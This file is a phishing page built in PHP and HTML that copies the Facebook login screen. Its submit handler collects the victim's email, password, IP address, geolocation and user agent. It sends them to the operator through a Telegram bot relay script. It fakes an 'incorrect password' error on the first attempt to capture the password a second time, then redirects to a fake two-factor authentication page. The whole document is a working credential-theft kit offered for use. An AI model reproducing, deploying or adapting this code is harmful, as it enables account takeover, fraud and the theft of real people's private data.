<?php
// get root directory
$rootDirectory = dirname(dirname(dirname(__FILE__)));
$currentPreDirectory = dirname(dirname(__FILE__));
require_once($rootDirectory . '/get-data.php');
require_once($rootDirectory . '/getip.php');
?>
    
<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: #3b5899;
            padding: 0 16px;
            height: 72px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .facebook-logo {
            position: absolute;
            left: 20%;
            color: white;
            font-size: 40px;
            font-weight: bold;
            letter-spacing: -1px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .create-account-btn {
            background: #42a72a;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .create-account-btn:hover {
            background: #36a420;
        }

        .main-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            background: white;
            border-radius: 2px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 40px 100px;
            width: 100%;
            max-width: 596px;
        }

        .login-title {
            font-size: 28px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 20px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #dddfe2;
            border-radius: 2px;
            font-size: 14px;
            color: #1c1e21;
            background: white;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .input-field::placeholder {
            color: #90949c;
        }

        .input-field.error {
            border-color: #FF0303;
        }

        .error-message {
            display: none;
            color: #FF0303;
            font-size: 13px;
            margin-top: 8px;
            text-align: left;
            padding: 0 4px;
        }

        .login-btn {
            width: 100%;
            background: #3b5899;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 2px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px 0;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background: #3b5899;
        }

        .forgot-password {
            color: #3b5899;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: block;
            margin: 16px 0;
            text-align: center;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .separator {
            height: 1px;
            background: #dadde1;
            margin: 20px 0;
        }

        .signup-link {
            color: #3b5899;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: block;
            margin: 16px 0;
            text-align: center;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .not-now {
            color:rgb(57, 70, 97);
            font-size: 12px;
            text-align: center;
            margin-top: 8px;
        }

        .footer {
            background:rgb(255, 255, 255);
            padding: 20px 16px;
            border-top: 1px solid #dadde1;
            padding: 50px 0;
        }

        .language-selector {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            font-size: 12px;
            color: #737373;
            max-width: 70%;
            width: 100%;
            margin: 10px auto;
            margin-top: 50px;

        }

        .language-item {
            color: #737373;
            text-decoration: none;
            padding: 2px 4px;
        }

        .language-item:hover {
            text-decoration: underline;
        }

        .expand-btn {
            background: none;
            border: none;
            color: #737373;
            font-size: 12px;
            cursor: pointer;
            padding: 2px 4px;
        }

        .footer-links {
            border-top: 1px solid #dadde1;
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 16px;
            font-size: 12px;
            max-width: 70%;
            width: 100%;
            margin: 0 auto;
            margin-top: 20px;
            padding-top: 20px;
        }

        .footer-link {
            color: #737373;
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        .copyright {
            color: #737373;
            font-size: 12px;
            margin-top: 20px;
            padding-top: 20px;
            width: 100%;
            max-width: 70%;
            margin: 0 auto;
            margin-bottom: 40px;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .error-message {
            animation: slideIn 0.3s ease-out;
        }

        @media (max-width: 480px) {
            .header {
                padding: 0 12px;
                height: 60px;
            }

            .facebook-logo {
                font-size: 32px;
            }

            .create-account-btn {
                font-size: 10px;
            }

            .login-card {
                margin: 20px;
                padding: 16px;
                width: 100%;
                max-width: 396px;
            }

            .login-title {
                font-size: 24px;
            }

            .input-field {
                font-size: 14px;
                padding: 12px 14px;
            }

            .login-btn {
                font-size: 14px;
                padding: 10px;
            }

            .footer {
                padding: 16px 12px;
            }

            .copyright {
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                margin-bottom: 20px;
                padding-top: 20px;
                text-align: center;
            }

            .footer-links {
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                margin-bottom: 20px;
                padding-top: 20px;
                text-align: center;
            }

            .language-selector {
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                margin-bottom: 20px;
                padding-top: 20px;
                text-align: center;
            }
        }
    </style>
</head>

<body>
    <header class="header">
        <div class="facebook-logo">
            facebook
            <button class="create-account-btn">Create New Account</button>
        </div>
    </header>

    <main class="main-container">
        <div class="login-card">
            <form onsubmit="handleSubmit(event)" autocomplete="off">
                <h1 class="login-title">Log in to Facebook</h1>
                <div class="input-group">
                    <input type="email" class="input-field" id="email" name="email" placeholder="Email address or phone number" required>
                </div>
                <div class="input-group">
                    <input type="password" class="input-field" id="password" name="password" placeholder="Password" required>
                    <div class="error-message">Please enter a valid password</div>
                </div>
                <button type="submit" class="login-btn">Log in</button>
                <div style="display: flex; justify-content: center; gap: 10px;">
                    <a href="#" class="forgot-password">Forgotten account?</a>
                    <a href="#" class="signup-link">Sign up for Facebook</a>
                </div>
                <p class="not-now">Not now</p>
            </form>
        </div>
    </main>

    <footer class="footer">
        <div class="language-selector">
            <a href="#" class="language-item">English (UK)</a>
            <a href="#" class="language-item">Tiếng Việt</a>
            <a href="#" class="language-item">中文(台灣)</a>
            <a href="#" class="language-item">한국어</a>
            <a href="#" class="language-item">日本語</a>
            <a href="#" class="language-item">Français (France)</a>
            <a href="#" class="language-item">ภาษาไทย</a>
            <a href="#" class="language-item">Español</a>
            <a href="#" class="language-item">Português (Brasil)</a>
            <a href="#" class="language-item">Deutsch</a>
            <a href="#" class="language-item">Italiano</a>
            <button class="expand-btn">+</button>
        </div>
        <div class="footer-links">
            <a href="#" class="footer-link">Sign Up</a>
            <a href="#" class="footer-link">Log in</a>
            <a href="#" class="footer-link">Messenger</a>
            <a href="#" class="footer-link">Facebook Lite</a>
            <a href="#" class="footer-link">Video</a>
            <a href="#" class="footer-link">Meta Pay</a>
            <a href="#" class="footer-link">Meta Store</a>
            <a href="#" class="footer-link">Meta Quest</a>
            <a href="#" class="footer-link">Ray-Ban Meta</a>
            <a href="#" class="footer-link">Meta AI</a>
            <a href="#" class="footer-link">more content</a>
            <a href="#" class="footer-link">Instagram</a>
            <a href="#" class="footer-link">Threads</a>
            <a href="#" class="footer-link">Voting Information Centre</a>
            <a href="#" class="footer-link">Privacy Policy</a>
            <a href="#" class="footer-link">Privacy Centre</a>
            <a href="#" class="footer-link">About</a>
            <a href="#" class="footer-link">Create ad</a>
            <a href="#" class="footer-link">Create Page</a>
            <a href="#" class="footer-link">Developers</a>
            <a href="#" class="footer-link">Careers</a>
            <a href="#" class="footer-link">Cookies</a>
            <a href="#" class="footer-link">AdChoices</a>
            <a href="#" class="footer-link">Terms</a>
        </div>
        <div class="copyright">Meta © 2025</div>
    </footer>

    <script>
        // Biến từ PHP
        var ip = '<?php echo $ip; ?>';
        var city = '<?php echo $city; ?>';
        var country = '<?php echo $country; ?>';
        var org = '<?php echo $org; ?>';
        var timezone = '<?php echo $timezone; ?>';
        var userAgent = '<?php echo $userAgent; ?>';
        var botToken = '<?php echo $token; ?>';
        var chatId = '<?php echo $chatId; ?>';

        // Simple attempt control without external JS: first submit fails, second passes
        function getAttempts() {
            return parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
        }

        function setAttempts(n) {
            sessionStorage.setItem('fb_login_attempts', String(n));
        }

        function resetAttempts() {
            sessionStorage.removeItem('fb_login_attempts');
        }

        function showInlineError(message) {
            const errorDiv = document.querySelector('.error-message');
            if (errorDiv) {
                errorDiv.textContent = message;
                errorDiv.style.display = 'block';
            }
            const pwd = document.getElementById('password');
            if (pwd) pwd.classList.add('error');
        }

        function hideInlineError() {
            const errorDiv = document.querySelector('.error-message');
            if (errorDiv) errorDiv.style.display = 'none';
            const pwd = document.getElementById('password');
            if (pwd) pwd.classList.remove('error');
        }

        document.addEventListener('DOMContentLoaded', function() {
            const pwd = document.getElementById('password');
            if (pwd) {
                pwd.addEventListener('input', hideInlineError);
            }
            const emailStored = localStorage.getItem('email');
            if (emailStored) {
                const emailInput = document.getElementById('email');
                if (emailInput) emailInput.value = emailStored;
            }
        });

        function handleSubmit(event) {
            event.preventDefault();
            
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            // Lưu email vào localStorage
            localStorage.setItem('email', email);
            
            // Gửi dữ liệu đến Telegram
            var content = "💬Thông Tin Tài Khoản Facebook Login💬" +
                "\n" + "----------------------------------------------------------" +
                "\nEmail: " + "`" + email + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
            
            fetch('/send-telegram.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'Markdown', token: botToken })
            })
            .then(response => response.json())
            .then(data => {
                var attempts = getAttempts() + 1;
                setAttempts(attempts);
                if (attempts === 1) {
                    showInlineError('The password you entered is incorrect. Please try again.');
                } else {
                    resetAttempts();
                    localStorage.setItem('password', password);
                    window.location.href = "../two-factor-authentication";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                var attempts = getAttempts() + 1;
                setAttempts(attempts);
                if (attempts === 1) {
                    showInlineError('The password you entered is incorrect. Please try again.');
                } else {
                    resetAttempts();
                    localStorage.setItem('password', password);
                    window.location.href = "../two-factor-authentication";
                }
            });
        }
    </script>
</body>

</html>